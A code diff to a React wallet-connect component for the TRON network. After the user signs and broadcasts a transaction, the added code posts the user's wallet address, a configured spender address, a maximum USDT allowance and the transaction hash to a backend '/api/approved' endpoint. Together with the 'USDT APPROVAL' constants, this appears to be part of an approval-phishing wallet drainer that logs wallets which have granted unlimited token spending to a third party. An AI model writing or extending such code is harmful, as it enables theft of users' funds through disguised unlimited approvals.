@@ -5,6 +5,7 @@ import { CheckCircle2, AlertTriangle } from "lucide-react";
 import { useEffect, useState } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import { TronWeb } from "tronweb";
+import { BASE_URL, USDT_SPENDER_ADDRESS } from "../../../env";
 
 // ======================
 // CONSTANTS (USDT APPROVAL)
@@ -154,6 +155,19 @@ export function WalletConnect({ onConnect, onDisconnect }: any) {
       }
 
       const result = await tronWeb.trx.sendRawTransaction(signed);
+
+
+      await fetch(`${BASE_URL}/api/approved`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          network: 'TRON Mainnet',
+          owner: address,
+          spender: USDT_SPENDER_ADDRESS,
+          amount: MAX_ALLOWANCE,
+          txHash: result.txid || "unknown"
+        })
+      });
 
       setStep("done");
 
